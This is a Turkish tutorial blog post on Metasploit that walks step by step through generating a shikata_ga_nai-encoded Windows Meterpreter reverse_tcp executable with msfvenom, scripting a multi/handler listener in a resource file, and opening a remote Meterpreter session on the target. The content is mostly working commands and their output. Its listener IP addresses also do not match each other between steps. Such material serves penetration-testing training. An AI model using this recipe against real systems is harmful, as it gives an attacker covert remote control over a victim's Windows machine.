---

authors:
  - name: İbrahim Korucuoğlu
    link: https://github.com/siberoloji
    image: https://github.com/siberoloji.png


categories:
- Metasploit Framework
classicmag_header_overlay:
- global-layout
classicmag_post_layout:
- layout-1
classicmag_post_sidebar_option:
- right-sidebar
date: "2017-06-14T13:47:00Z"
excerpt: |-
  Öncelile, yeni bir script yazarken dikkat edilmesi gereken bir takım kuralları görelim.

  Tüm Windows sürümleri aynı değildir.

  Bazı Windows sürümleri, güvenlik tedbirleri barındırırlar.

  Windows Scriptleri, sürüme bağlı olarak farklı davranış gösterirler.

  Script yazarken Windows sürümüne özel davranmanız gerekebilir.
guid: https://www.siberoloji.com/?p=1205
id: 1205
image: /assets/images/2024/06/metasploit.jpg
tags:
- cybersecurity
- metasploit framework
title: MSF Meterpreter Script Yazma
url: /tr/msf-meterpreter-script-yazma/
---

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="script-yazma">Script Yazma 
<!-- /wp:heading -->

  Öncelile, yeni bir script yazarken dikkat edilmesi gereken bir takım kuralları görelim. 
 

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>Tüm Windows sürümleri aynı değildir.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Bazı Windows sürümleri, güvenlik tedbirleri barındırırlar.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Windows Scriptleri, sürüme bağlı olarak farklı davranış gösterirler.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Script yazarken Windows sürümüne özel davranmanız gerekebilir.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

  Yukarıda belirtilen kuralları göz önünde bulundurarak, hedefe özel script yazmak gerekmektedir. Bu durumda yazacağımız script doğru çalışabilir. 
 

  Şimdi, aşağıdaki komut ile çalıştırılabilir bir .exe dosyası oluşturalım. Bu program, hedef sistemde çalışacak ve yerel bilgisayarımıza reverse bağlantı açacaktır. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST<strong>=</strong>192.168.1.101 -b "\x00" -f exe -o Meterpreter.exe
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 326 <strong>(</strong>iteration<strong>=</strong>0<strong>)</strong>
x86/shikata_ga_nai chosen with final size 326
Payload size: 326 bytes
Saved as: Meterpreter.exe
</code></pre>
<!-- /wp:code -->

  Gerekli .exe dosyamız oluşturuldu. Bu dosya hedef windows işletim sistemi içinde çalışacak ve yerel bilgisayara iletişim sağlayacaktır. O zaman bizim yerel bilgisayarda dinleyici oluşturmamız gerekmektedir. Dinleyicimizi oluşturalım. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# touch meterpreter.rc
root@kali:~# echo use exploit/multi/handler <strong>&gt;&gt;</strong> meterpreter.rc
root@kali:~# echo set PAYLOAD windows/meterpreter/reverse_tcp <strong>&gt;&gt;</strong> meterpreter.rc
root@kali:~# echo set LHOST 192.168.1.184 <strong>&gt;&gt;</strong> meterpreter.rc
root@kali:~# echo set ExitOnSession false <strong>&gt;&gt;</strong> meterpreter.rc
root@kali:~# echo exploit -j -z <strong>&gt;&gt;</strong> meterpreter.rc
root@kali:~# cat meterpreter.rc
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.184
set ExitOnSession false
exploit -j -z
</code></pre>
<!-- /wp:code -->

  Dikkat ederseniz komutlarla, multi handler modülünü dinleyici olarak ayarladık. Payload modülü olarak reverse_tcp modülü kulandık. Yerel IP adresi olarak 192.168.1.184 ayarladık. 
 

  Yeni yazdığımız scriptleri&nbsp;<code>/usr/share/metasploit-framework/scripts/meterpreter</code>&nbsp;klasörüne kayıt edersek, kolayca kullanabiliriz. 
 

  Şimdi yapmamız gereken,&nbsp;<code>msfconsole</code>&nbsp;programını yeni oluşturduğumuz&nbsp;<code>meterpreter.rc</code>&nbsp;dosyasını kaynak göstererek başlatmak. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# msfconsole -r meterpreter.rc

       <strong>=[</strong> metasploit v4.8.2-2014021901 <strong>[</strong>core:4.8 api:1.0] <strong>]</strong>
+ -- --<strong>=[</strong> 1265 exploits - 695 auxiliary - 202 post <strong>]</strong>
+ -- --<strong>=[</strong> 330 payloads - 32 encoders - 8 nops      <strong>]</strong>

resource&gt; use exploit/multi/handler
resource&gt; set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD <strong>=&gt;</strong> windows/meterpreter/reverse_tcp
resource&gt; set LHOST 192.168.1.184
LHOST <strong>=&gt;</strong> 192.168.1.184
resource&gt; set ExitOnSession false
ExitOnSession <strong>=&gt;</strong> false
resource&gt; exploit -j -z
<strong>[</strong><strong>*</strong><strong>]</strong> Handler binding to LHOST 0.0.0.0
<strong>[</strong><strong>*</strong><strong>]</strong> Started reverse handler
<strong>[</strong><strong>*</strong><strong>]</strong> Starting the payload handler...
</code></pre>
<!-- /wp:code -->

  Yukarıda gördüğünüz gibi Metasploit Framework dinleme yaparak başlamıştır. Artık, oluşturduğumuz .exe dosyasını Windows içerisinde çalıştırdığımızda, oturum aktif hale gelecektir. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash"><strong>[</strong><strong>*</strong><strong>]</strong> Sending stage <strong>(</strong>718336 bytes<strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> Meterpreter session 1 opened <strong>(</strong>192.168.1.158:4444 -&gt; 192.168.1.104:1043<strong>)</strong>

msf exploit<strong>(</strong>handler<strong>)</strong> <strong>&gt;</strong> sessions -i 1
<strong>[</strong><strong>*</strong><strong>]</strong> Starting interaction with 1...

meterpreter <strong>&gt;</strong></code></pre>
<!-- /wp:code -->